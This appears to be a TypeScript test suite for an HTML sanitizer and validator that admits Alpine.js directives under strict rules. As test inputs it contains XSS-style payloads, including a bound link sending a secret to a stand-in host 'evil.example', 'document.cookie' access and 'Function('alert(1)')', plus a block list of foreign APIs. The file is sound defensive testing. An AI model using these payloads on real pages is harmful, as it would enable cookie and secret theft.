import { describe, expect, test } from "bun:test"
import { render } from "./html.js"
import { sanitizeHtml } from "./sanitize.js"
import { validateUi } from "./validate.js"

/**
 * The Alpine admission spec: directives pass ONLY in alpine mode, the
 * dangerous ones never pass, and the expression gate polices vocabulary.
 * These are attack tests in the sanitize.test.ts tradition — the cases ARE
 * the boundary.
 */

const out = (html: string, alpine: boolean): string =>
  render(sanitizeHtml(html, { alpine }).html)

describe("sanitizeHtml — alpine mode admission", () => {
  test("directives survive in alpine mode and are stripped outside it", () => {
    const html = `<div x-data="{open:false}"><button @click="open=!open">menu</button><span x-show="open" x-text="label"></span></div>`
    const on = out(html, true)
    expect(on).toContain(`x-data="{open:false}"`)
    expect(on).toContain(`@click="open=!open"`)
    expect(on).toContain(`x-show="open"`)
    const off = out(html, false)
    expect(off).not.toContain("x-data")
    expect(off).not.toContain("@click")
  })

  test("x-html and x-teleport are banned even in alpine mode", () => {
    const res = sanitizeHtml(`<div x-html="payload" x-teleport="#ef-shell">x</div>`, {
      alpine: true,
    })
    expect(render(res.html)).not.toContain("x-html")
    expect(render(res.html)).not.toContain("x-teleport")
    expect(res.dropped).toContain("div[x-html]")
    expect(res.dropped).toContain("div[x-teleport]")
  })

  test("URL/style attributes may not be BOUND (static checks would be bypassed)", () => {
    const res = sanitizeHtml(
      `<a :href="'https://evil.example/?d='+secret" x-bind:src="u" :style="css" :class="ok">x</a>`,
      { alpine: true },
    )
    const html = render(res.html)
    expect(html).not.toContain(":href")
    expect(html).not.toContain("x-bind:src")
    expect(html).not.toContain(":style")
    expect(html).toContain(`:class="ok"`)
  })

  test("bound event handlers (:onclick, x-bind:onload) never pass", () => {
    const html = out(`<div :onclick="x" x-bind:onload="y">x</div>`, true)
    expect(html).not.toContain("onclick")
    expect(html).not.toContain("onload")
  })

  test("<template> is a container in alpine mode, dropped-with-contents outside", () => {
    const html = `<template x-if="open"><p>inner</p></template>`
    expect(out(html, true)).toBe(`<template x-if="open"><p>inner</p></template>`)
    expect(out(html, false)).toBe("")
  })

  test("script inside an alpine template still dies", () => {
    const html = out(`<template x-for="i in 3"><script>alert(1)</script><b>ok</b></template>`, true)
    expect(html).not.toContain("script")
    expect(html).toContain("<b>ok</b>")
  })
})

describe("validateUi — the alpine-expr family", () => {
  const opts = { alpine: true }

  test("a clean local-state page passes", () => {
    const page = `<div x-data="{seconds:1500,running:false}"><p x-text="Math.floor(seconds/60)+':'+String(seconds%60).padStart(2,'0')">25:00</p><button @click="running=!running">start / pause</button><button @click="seconds=1500;running=false">reset</button></div>`
    expect(validateUi(page, opts)).toEqual([])
  })

  test("setInterval-driven timers are legitimate local behavior", () => {
    const page = `<div x-data="{s:1500,t:null}" x-init="t=setInterval(()=>{ if (s>0) s-- },1000)"><span x-text="s">1500</span></div>`
    expect(validateUi(page, opts)).toEqual([])
  })

  test.each([
    ["fetch", `<button @click="fetch('https://x.example')">go</button>`],
    ["localStorage", `<div x-init="localStorage.setItem('k',v)">x</div>`],
    ["location", `<button @click="location.href='https://x.example'">go</button>`],
    ["document", `<div x-init="document.cookie">x</div>`],
    ["Function", `<div x-data="{f:Function('alert(1)')}">x</div>`],
  ])("foreign API %s in an expression is a finding", (_api, html) => {
    const findings = validateUi(html, opts)
    expect(findings.some((f) => f.rule === "alpine-expr")).toBe(true)
  })

  test("x-html is called out with its own message", () => {
    const findings = validateUi(`<div x-html="markup">x</div>`, opts)
    expect(findings.some((f) => f.rule === "alpine-expr" && f.detail.includes("x-html"))).toBe(true)
  })

  test("without alpine mode the directives are dangerous-vocabulary instead", () => {
    const findings = validateUi(`<div x-data="{a:1}">x</div>`)
    expect(findings.some((f) => f.rule === "dangerous-vocabulary")).toBe(true)
    expect(findings.some((f) => f.rule === "alpine-expr")).toBe(false)
  })
})
